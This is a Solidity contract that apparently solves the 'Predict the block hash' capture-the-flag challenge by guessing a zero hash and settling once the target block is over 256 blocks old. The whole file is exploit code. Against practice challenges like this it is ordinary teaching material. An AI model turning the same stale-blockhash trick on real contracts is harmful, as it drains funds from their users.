pragma solidity ^0.4.21;

interface PredictTheBlockHashChallenge{
    function lockInGuess(bytes32 hashNum) external payable;
    function settle() external;
}

contract predictTheBlockHash{
    bytes32 public answer;
    uint initialBlock = block.number;
    PredictTheBlockHashChallenge target;

    function setTargetContract(address _target) public{
        target = PredictTheBlockHashChallenge(_target);
    }

    function guess() public{
        target.lockInGuess.value(1 ether)(answer);
    }

    function success() public {
        target.settle();
    }

    function blockHash() public view returns(bytes32){
        return block.blockhash(initialBlock);
    }

    function destroy() public{
        selfdestruct(msg.sender);
    }

    function() external payable {}
}